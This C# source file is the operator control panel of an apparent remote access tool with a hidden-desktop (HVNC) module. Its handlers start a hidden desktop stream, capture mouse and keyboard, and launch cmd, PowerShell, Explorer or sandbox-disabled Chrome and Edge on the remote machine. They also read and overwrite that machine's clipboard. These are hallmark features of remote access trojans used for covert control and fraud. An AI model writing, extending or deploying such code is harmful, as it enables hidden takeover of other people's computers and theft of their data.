using System;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Server
{
    public partial class FrmHVNC
    {
        #region Start/Stop

        private void toolStripButtonStart_Click(object sender, EventArgs e)
        {
            RequestHVNCStart req = new RequestHVNCStart();
            req.Fps = _currentFps;
            oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
            toolStripButtonStart.Enabled = false;
            toolStripButtonStop.Enabled = true;
        }

        private void toolStripButtonStop_Click(object sender, EventArgs e)
        {
            oSession.Send(ePacketType.PACKET_HVNC_STOP_REQUEST, null);
            toolStripButtonStart.Enabled = true;
            toolStripButtonStop.Enabled = false;
        }

        #endregion

        #region Capture options

        private void toolStripSplitButtonCapture_ButtonClick(object sender, EventArgs e)
        {
            toolStripSplitButtonCapture.ShowDropDown();
        }

        private void toolStripMenuItemCaptureMouse_Click(object sender, EventArgs e)
        {
            toolStripMenuItemCaptureMouse.Checked = !toolStripMenuItemCaptureMouse.Checked;
            _isCaptureMouse = toolStripMenuItemCaptureMouse.Checked;
        }

        private void toolStripMenuItemCaptureKeyboard_Click(object sender, EventArgs e)
        {
            toolStripMenuItemCaptureKeyboard.Checked = !toolStripMenuItemCaptureKeyboard.Checked;
            _isCaptureKeyboard = toolStripMenuItemCaptureKeyboard.Checked;
        }

        #endregion

        #region FPS selection

        private void toolStripSplitButtonFPS_ButtonClick(object sender, EventArgs e)
        {
            toolStripSplitButtonFPS.ShowDropDown();
        }

        private void toolStripMenuItemFPS_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem item = sender as ToolStripMenuItem;
            if (item == null || item.Tag == null) return;

            foreach (ToolStripItem child in toolStripSplitButtonFPS.DropDownItems)
            {
                var mi = child as ToolStripMenuItem;
                if (mi != null) mi.Checked = false;
            }
            item.Checked = true;
            _currentFps = Convert.ToInt32(item.Tag);

            RequestHVNCStart req = new RequestHVNCStart();
            req.Fps = _currentFps;
            oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
        }

        #endregion

        #region Run process

        private void toolStripButtonRunProcess_Click(object sender, EventArgs e)
        {
            var dlg = new FrmInputUrl();
            dlg.Text = "启动程序 - 输入程序路径(cmd.exe)";
            dlg.ShowDialog();
            string input = dlg.InputText;
            if (!string.IsNullOrEmpty(input))
            {
                RequestHVNCRunProcess req = new RequestHVNCRunProcess();
                string[] parts = input.Split(new char[] { ' ' }, 2);
                req.FilePath = parts[0];
                req.Arguments = parts.Length > 1 ? parts[1] : "";
                oSession.Send(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, req);
            }
        }

        #endregion

        #region Quick launch apps

        private void toolStripMenuItemLaunchChrome_Click(object sender, EventArgs e)
        {
            SendRunProcess("chrome.exe", "--no-sandbox");
        }

        private void toolStripMenuItemLaunchEdge_Click(object sender, EventArgs e)
        {
            SendRunProcess("msedge.exe", "--no-sandbox");
        }

        private void toolStripMenuItemLaunchCMD_Click(object sender, EventArgs e)
        {
            SendRunProcess("cmd.exe", "");
        }

        private void toolStripMenuItemLaunchPowerShell_Click(object sender, EventArgs e)
        {
            SendRunProcess("powershell.exe", "");
        }

        private void toolStripMenuItemLaunchExplorer_Click(object sender, EventArgs e)
        {
            SendRunProcess("explorer.exe", "");
        }

        private void SendRunProcess(string filePath, string arguments)
        {
            var req = new RequestHVNCRunProcess();
            req.FilePath = filePath;
            req.Arguments = arguments;
            oSession.Send(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, req);
        }

        #endregion

        #region Clipboard

        private void toolStripButtonClipboardGet_Click(object sender, EventArgs e)
        {
            oSession.Send(ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST, new RequestClipboardGet());
            toolStripLabelStatus.Text = "正在获取远程剪贴板...";
        }

        private void toolStripButtonClipboardSet_Click(object sender, EventArgs e)
        {
            string localText = "";
            if (Clipboard.ContainsText())
            {
                localText = Clipboard.GetText();
            }
            if (string.IsNullOrEmpty(localText))
            {
                toolStripLabelStatus.Text = "本地剪贴板为空";
                return;
            }
            var req = new RequestClipboardSet();
            req.Text = localText;
            oSession.Send(ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST, req);
            toolStripLabelStatus.Text = "已发送到远程剪贴板";
        }

        #endregion
    }
}
